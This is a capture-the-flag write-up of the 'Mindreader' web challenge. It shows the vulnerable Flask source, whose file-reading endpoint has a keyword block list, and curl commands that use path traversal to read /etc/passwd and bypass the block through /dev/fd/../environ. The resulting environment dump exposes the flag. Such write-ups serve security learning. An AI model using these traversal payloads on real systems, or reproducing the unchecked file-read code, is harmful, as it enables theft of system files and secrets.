## Mindreader
### Description
Category: Miscellaneous
Difficulty: Easy
```
Can you read my mind?

Challenge running at https://mindreader.web.ctfcompetition.com/
```
### Exploration
Visiting the challenge URL produces a web page:
```html
<html>
<head>
</head>
<body>
    <p>Hello, what do you want to read?</p>
    <form method="GET">
        <input type="text" name="f">
        <input type="submit" value="Read">
    </form>
</body>
</html>
```
### File reading
We guess that `f` stands for `file` and this script will read file contents.
Reading `flag` and `flag.txt` yielded nothing.

Since this is an easy challenge we also guess that it's vulnerable to directory traversal.
Fetching https://mindreader.web.ctfcompetition.com/?f=../../../../../etc/passwd confirmed this:
```
notcake@knotcake:~/googlectf$ curl https://mindreader.web.ctfcompetition.com/?f=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
The flag was also not here.
It turned out that https://mindreader.web.ctfcompetition.com/?f=/etc/passwd also worked.

### Reading the page's source
After trying to read `index.php` failed and many failed attempts to work out what was running the web server (nothing in `/proc` could be read), the hint for Secret Notes helped: `Hint: pyc`
```python
notcake@knotcake:~/googlectf$ curl https://mindreader.web.ctfcompetition.com/?f=main.py
from flask import Flask, request, abort
import re
import os
import logging

assert os.environ['FLAG']

app = Flask(__name__)

INDEX = open('index.html').read()

HALL_OF_SHAME = []

@app.route('/')
def index():
    for ip in request.headers.get('X-Forwarded-For', '').split(','):
        ip = ip.strip().lower()
        if ip in HALL_OF_SHAME:
            abort(403)

    if 'f' in request.args:
        try:
            f = request.args['f']
            if re.search(r'proc|random|zero|stdout|stderr', f):
                abort(403)
            elif '\x00' in f:
                abort(404)
            return open(f).read(4096)
        except IOError:
            abort(404)
    else:
        return INDEX
```
From this it can be seen that:
- The flag is stored in an environment variable, `FLAG`
- `/proc` is blocked but the script goes to great lengths to not block `/dev`

`/proc/self/environ` can't be read directly, but something under `/dev` might help.
```
notcake@knotcake:~/googlectf$ ls -al /dev
...
crw-rw----  1 root video    29,   0 Jun  3 23:07 fb0
lrwxrwxrwx  1 root root          13 Jun  3 23:07 fd -> /proc/self/fd
crw-rw-rw-  1 root root      1,   7 Jun  3 23:07 full
...
```

### Solution
Reading `/dev/fd/../environ` works:
```
notcake@knotcake:~/googlectf$ curl https://mindreader.web.ctfcompetition.com/?f=/dev/fd/../environ
GAE_MEMORY_MB=614HOSTNAME=2df8b7058b79GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-lmkjPORT=8080HOME=/rootPYTHONUNBUFFERED=1GAE_SERVICE=mindreader-sss6w3uqjfrcntmnPATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243LANG=C.UTF-8DEBIAN_FRONTEND=noninteractiveGCLOUD_PROJECT=ctf-web-kuqo48dGOOGLE_CLOUD_PROJECT=ctf-web-kuqo48dCHALLENGE_NAME=mindreaderVIRTUAL_ENV=/envPWD=/home/vmagent/appGAE_VERSION=20170618t144344FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}
```
And the flag is `CTF{ee02d9243ed6dfcf83b8d520af8502e1}`.
